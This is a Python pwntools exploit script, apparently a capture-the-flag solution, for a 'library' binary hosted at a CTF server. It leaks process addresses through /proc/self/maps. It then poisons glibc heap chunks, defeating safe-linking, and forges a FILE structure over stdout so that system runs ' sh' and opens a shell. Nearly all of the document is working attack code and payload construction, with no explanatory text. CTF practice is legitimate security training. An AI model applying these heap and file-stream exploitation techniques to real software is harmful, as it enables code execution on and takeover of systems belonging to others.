from pwn import *
from icecream import ic

elf = exe = ELF("./library_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.lac.tf", 31174)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *read_book
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def order(book):
    sla(b"choice:", b"1")
    ru("ordering book with id: ")
    book_id = int(rl().strip())
    sa(b"enter name:", book)
    return book_id 

def read(book_id):
    sla(b"choice:", b"2")
    sla(b"enter id:", str(book_id))

def review(book_id, review_len, review):
    sla(b"choice:", b"3")
    sla(b"enter id:", str(book_id))
    sla(b"enter review length:", str(review_len))
    sa(b"review:", review)

def manage_acc(bio, card_len, library_card, recover):
    sla(b"choice:", b"4")
    sla(b"would you like to update your bio? [Y/n]", b"y")
    sa(b"bio:", bio)
    sla(b"would you like to add your library card? [Y/n]", b"y")
    sla(b"enter card length: ", str(card_len))
    sa(b"card:", library_card)
    sla(b"would you like to recover settings through RAIS? [Y/n]", recover)

def clear_review(book_id):
    sla(b"choice:", b"3")
    sla(b"enter id:", str(book_id))
    sla(b"would you like to delete the current review? [Y/n] ", b"y")

order(b"/proc/self/maps")
for i in range(63):
    order(b"flag.txt")

order(b"flag" + p64(0x1a1))
review(0, 0xff70, b"A")

read(0)

rl()
elf.address = int(ru("-"), 16)

x = 7
if args.REMOTE:
    x -= 2
for i in range(x):
    rl()
heap_address = int(ru("-"), 16)
rl()
rl()
libc.address = int(ru("-"), 16)

ic(hex(elf.address))
ic(hex(libc.address))
ic(hex(heap_address))

# manage_acc(b"a"*0x10, 0x100, b"b"*0x100, b"n")

payload = p64(0)
payload += p64(0x160)
payload += p64(heap_address + 0x10e90)
payload += p64(heap_address + 0x10e90)
review(3, 0x38, b'a')
review(4, 0x128, b'a')
clear_review(3)
review(3, 0x38, payload)

payload = b'a'*0x120 + p64(0x160)
review(5, 0xf8, b'\x00'*0xf8)
clear_review(4)
review(4, 0x128, payload)

for i in range(7):
    review(6 + i, 0xf8, b'\x00'*0xf7)

for i in range(7):
    clear_review(6 + i)

clear_review(5)
# pause()
review(6, 0x158, b'a')
review(7, 0x128, b'a')
clear_review(7)

clear_review(4)

target = libc.address + 0x2045c0 - 0x10
ic(hex(target))
ic(hex(heap_address))
payload = b'a'*(0x28) + p64(0x131) + p64(target ^ (heap_address>>12))
clear_review(6)
review(6, 0x158, payload)

# pause()
review(7, 0x128, b'a')

# stdout_lock = libc.address + 0x21ba70	# _IO_stdfile_1_lock  (symbol not exported)
# stdout = libc.sym['_IO_2_1_stdout_']
# fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# gadget = libc.address + 0x00000000001724f0
# fake = FileStructure(0)
# fake.flags = 0x3b01010101010101
# fake._IO_read_end=libc.sym['system']
# fake._IO_save_base = gadget
# fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
# fake._lock=stdout_lock
# fake._codecvt= stdout + 0xb8
# fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
# payload = bytes(fake)
# payload += p64(libc.sym['_IO_2_1_stdout_']-0xf0)

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP


payload = b'\x00'*0x20
payload += FSOP_struct(flags=u64(b' sh\x00'.ljust(8, b'\x00')), _old_offset = 0xffffffffffffffff, lock = heap_address, _offset = 0xffffffffffffffff, _wide_data=libc.sym['_IO_2_1_stdout_']-16, _unused2 = p32(0) + p64(libc.sym['system']) + p64(libc.address + 0x204620), vtable=libc.sym['_IO_file_jumps'] + 0x360 - 0x38)
# payload = b''
'''
payload += b'    sh\x00'.ljust(8, b'\x00')  # _flags
payload += p64(0)  # _IO_read_ptr
payload += p64(0)  # _IO_read_end
payload += p64(0)  # _IO_read_base
payload += p64(0)  # _IO_write_base
payload += p64(1)  # _IO_write_ptr
payload += p64(0)  # _IO_write_end
payload += p64(0)  # _IO_buf_base
payload += p64(0)  # _IO_buf_end
payload += p64(0)  # _IO_save_base
payload += p64(0)  # _IO_backup_base
payload += p64(0)  # _IO_save_end
payload += p64(0)  # _markers
payload += p64(0)  # _chain
payload += p32(0)  # _fileno
payload += p32(0)  # _flags2
payload += p64(0xffffffffffffffff)  # _old_offset
payload += p64(0)  # _cur_column
payload += p64(0)  # _vtable_offset
payload += p64(0)  # _shortbuf
payload += p64(next(libc.search(b'\x00')))  # _lock
payload += p64(0xffffffffffffffff)  # _offset
payload += p64(0)  # _codecvt
payload += p64(libc.sym['_IO_2_1_stderr_']-16)  # _wide_data
payload += p64(0)  # _freeres_list
payload += p64(0)  # _freeres_buf
payload += p64(0)  # __pad5
payload += p64(0)  # _mode
payload += p32(0)*2  # _unused2
payload += p64(libc.sym['system']) #_unused2+4
payload += p64(libc.sym['_IO_file_jumps']+104)
payload += p64(0xdeadbeef)  # vtable
# payload += b'\x00'*0x20
ic(hex(len(payload)))
'''
pause()
review(8, 0x128, payload)
# manage_acc(b"a"*0x10, 0x9, b"b"*0x9, b"n")
# order("potato")

io.interactive()
